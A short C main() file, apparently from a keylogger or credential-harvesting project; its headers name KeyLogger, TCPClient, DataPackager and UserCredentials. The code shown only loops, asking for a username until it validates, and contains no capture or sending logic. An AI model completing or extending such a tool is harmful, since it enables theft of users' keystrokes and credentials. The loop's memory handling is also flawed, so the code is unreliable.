#include "../headers/DataPackager.h"
#include "../headers/KeyLogger.h"
#include "../headers/StateManager.h"
#include "../headers/TCPClient.h"
#include "../headers/UserCredentials.h"
#include "../headers/ValidColors.h"

int main(int argc, char **argv)
{
	UserCredentials *userCredentials;
	stateType state;
	char *question, *response;
	char is_valid;

	/* first state always GetUsername */
	state = GetUsername;

	/* StateManager Loop: Ask Questions until all credentials valid */
	while(state != Logging)
	{
		question = getQuestion(state);
		if(state == GetUsername)
		{
			askQuestion(&question);
			response = getResponse();
			is_valid = checkValidUsername(response);
			setState(&state, is_valid);
		}

		free(response);
	}
	return 0;
}
